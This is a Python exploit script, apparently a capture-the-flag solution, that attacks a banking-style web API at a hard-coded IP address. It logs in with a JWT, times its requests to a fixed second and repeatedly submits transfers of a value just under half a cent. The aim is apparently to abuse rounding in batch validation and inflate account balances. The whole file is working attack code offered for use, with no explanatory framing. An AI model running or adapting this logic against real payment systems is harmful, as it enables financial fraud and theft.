import requests
from pprint import pprint

import time

from datetime import datetime

start = time.time()


url = 'http://91.92.201.197:5000'
#url = 'http://127.0.0.1:5000'


creds = {'username': 'negasora9', 'password': 'thisisastrongpassword'}

r = requests.post(f"{url}/register", json=creds)


lastrun = 0
while True:
    try:
        while datetime.now().second != 20:
            time.sleep(0.1)

        r = requests.post(f"{url}/login", json=creds)

        rj = r.json()

        jwt = rj['jwt']
        userid = rj['userid']

        s = requests.session()

        s.headers = {'Authorization': 'Bearer ' + jwt}

        r = s.get(f'{url}/batches')

        for i in r.json():
            if i['verified'] == 0:
                r = s.delete(f'{url}/batches', json={'batchid': i['batchid']})
                print('deleting invalid')

        def transfer(from_accs, to_accs, amt):
            for fromaccount in from_accs:
                r = s.post(f"{url}/batch/new", json={'senderid': fromaccount})
                batchinfo = [i for i in r.json() if i['verified'] == 0][0]

                for acc in to_accs:
                    r = s.post(f"{url}/transfer", json={'batchid': batchinfo['batchid'], 'amount': amt, 'recipient': acc})


                r = s.post(f"{url}/validate", json={'batchid': batchinfo['batchid']})

                stats = r.json()
                print('verified', len([i for i in stats if i['verified'] == 1]))
                print('executed', len([i for i in stats if i['executed'] == 1]))
                print('unverified', len([i for i in stats if i['verified'] == 0]))

        r = s.get(f"{url}/accounts")

        accounts = r.json()
        print(accounts)

        fromaccounts = [i for i in accounts if accounts[i]['name'] == "Current account"]
        toaccounts = [i for i in accounts if accounts[i]['name'] != "Current account"]

        for i in toaccounts:
            if accounts[i]['balance'] != '0.00':
                transfer([i], fromaccounts, accounts[i]['balance'])
        for reqnum in range(3):
            transfer(fromaccounts, toaccounts, '0.0049999999999999999999999999999999999999999999999999999999999')
    except:
        print("exception")
        pass
